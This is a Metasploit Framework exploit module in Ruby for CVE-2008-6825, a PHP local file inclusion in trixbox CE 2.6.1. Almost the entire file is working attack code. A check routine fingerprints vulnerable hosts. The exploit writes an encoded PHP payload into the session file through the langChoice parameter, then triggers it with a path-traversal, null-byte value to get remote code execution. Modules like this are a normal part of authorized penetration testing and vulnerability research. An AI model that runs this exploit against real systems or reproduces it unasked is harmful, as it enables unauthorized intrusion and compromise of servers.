##
# $Id: trixbox_langchoice.rb 11516 2011-01-08 01:13:26Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

# -*- coding: utf-8 -*-
require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ManualRanking

	PHPSESSID_REGEX = /(?:^|;?)PHPSESSID=(\w+)(?:;|$)/

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'Trixbox langChoice PHP Local File Inclusion',
			'Description' => %q{
					This module injects php into the trixbox session file and then, in a second call, evaluates
				that code by manipulating the langChoice parameter as described in OSVDB-50421.
			},
			'Author'      => ['chao-mu'],
			'License'     => BSD_LICENSE,
			'Version'     => '$Revision: 11516 $',
			'References'  =>
				[
					['OSVDB'   => '50421'],
					['CVE'     => '2008-6825'],
					['BID'     => '30135'],
					['URL'     => 'http://www.exploit-db.com/exploits/6026/'],
					['URL'     => 'http://www.trixbox.org/']
				],
			'Payload'     =>
				{
					# max header length for Apache (8190),
					# http://httpd.apache.org/docs/2.2/mod/core.html#limitrequestfieldsize
					# minus 23 for good luck (and extra spacing)
					'Space'       => 8190 - 23,
					'DisableNops' => true,
					'Compat'      =>
						{
							'ConnectionType' => 'find',
						},
					'BadChars'    => "'\"`"  # quotes are escaped by PHP's magic_quotes_gpc in a default install
				},
			'Targets'        => [['trixbox CE 2.6.1', {}]],
			'DefaultTarget'  => 0,
			'Platform'       => 'php',
			'Arch'           => ARCH_PHP,
			'DisclosureDate' => 'Jul 09 2008'
		))

		register_options(
			[
				OptString.new('URI',  [true, 'The uri that accepts the langChoice param', '/user/index.php']),
				OptString.new('PATH', [true, 'The path where the php was stored', '../../../../../../../../../../tmp/sess_!SESSIONID!%00']),
			], self.class)
	end

	def check
		# We need to ensure that this can be reached via POST
		uri = datastore['URI']
		target_code = 200

		print_status "Attempting to POST to #{uri}"
		response = send_request_cgi({'uri' => uri, 'method' => 'POST'})

		unless defined? response
			print_error 'Server did not respond to HTTP POST request'
			return Exploit::CheckCode::Safe
		end

		code = response.code

		unless code == target_code
			print_error "Expected HTTP code #{target_code}, but got #{code}."
			return Exploit::CheckCode::Safe
		end

		print_status "We received the expected HTTP code #{target_code}"

		# We will need the cookie PHPSESSID to continue
		cookies = response.headers['Set-Cookie']

		# Make sure cookies were set
		if defined? cookies and cookies =~ PHPSESSID_REGEX
			print_status "We were successfully sent a PHPSESSID of '#{$1}'"
		else
			print_error 'The server did not send us the cookie we were looking for'
			return Exploit::CheckCode::Safe
		end

		# Okay, at this point we're just being silly and hackish.
		unless response.body =~ /langChoice/
			print_error 'The page does not appear to contain a langChoice field'
			return Exploit::CheckCode::Safe
		end

		# XXX: Looking for a good way of determine if it is NOT trixbox
		# unless response.body.match(/trixbox - User Mode/)
		# 	print_status 'The target does not appear to be running trixbox'
		# 	return Exploit::CheckCode::Safe
		# end
		# print_status 'The target appears to be running trixbox'

		# If it has the target footer, we know its vulnerable
		# however skining may mean the reverse is not true
		# We've only tested on v2.6.1, so that is all we will guarantee
		# Example footer: v2.6.1 ©2008 Fonality
#		if response.body =~ /(v2\.(?:[0-5]\.\d|6\.[0-1]))\s{2}&copy;200[0-8] Fonality/
		if response.body =~ /(v2\.6\.1)\s{2}&copy;2008 Fonality/
			print_status "Trixbox #{$1} detected!"
			return Exploit::CheckCode::Vulnerable
		end

		print_status 'The target may be skinned making detection too difficult'

		if response.body =~ /trixbox - User Mode/
			return Exploit::CheckCode::Detected
		else
			return Exploit::CheckCode::Unknown
		end
	end

	def exploit
		# We will be be passing this our langChoice values
		uri = datastore['URI']

		# Prepare PHP file contents
		encoded_php_file = Rex::Text.uri_encode("<?php #{payload.encoded} ?>")

		# Deliver the payload
		print_status('Uploading the payload to the remote server')
		delivery_response = send_request_cgi({
				'uri'    => uri,
				'method' => 'POST',
				'data'   => "langChoice=#{encoded_php_file}%00"
			})

		# The call should return status code 200
		if delivery_response.code != 200
			raise RuntimeError, "Server returned unexpected HTTP code #{delivery_response.code}"
		end

		print_status "The server responded to POST with HTTP code #{delivery_response.code}"

		# We will need the cookie PHPSESSID to continue
		cookies = delivery_response.headers['Set-Cookie']

		# Make sure cookies were set
		if cookies.nil?
			raise RuntimeError, 'The server did not set any cookies'
		end

		# Contents of PHPSESSID. About to be set.
		session_id = nil

		# Retrieve the session id from PHPSESSID
		if cookies =~ PHPSESSID_REGEX
			session_id = $1
		else
			raise RuntimeError, 'The cookie PHPSESSID was not set.'
		end

		print_status "We were assigned a session id (cookie PHPSESSID) of '#{session_id}'"

		# Prepare the value that will execute our payload
		detonation = datastore['PATH'].sub('!SESSIONID!', session_id)

		print_status "We will use '#{detonation}' as the value of langChoice to detonate the payload"

		# Request the detonation uri, detonating the payload
		print_status 'Attempting to detonate. You will need to clean /tmp/ yourself.'

		# Small timeout as we're just going to assume we succeeded.
		send_request_cgi({
				'uri' => uri,
				'cookie' => cookies,
				'method' => 'POST',
				'data' => "langChoice=#{detonation}%00"
			}, 0.01)

		handler
	end
end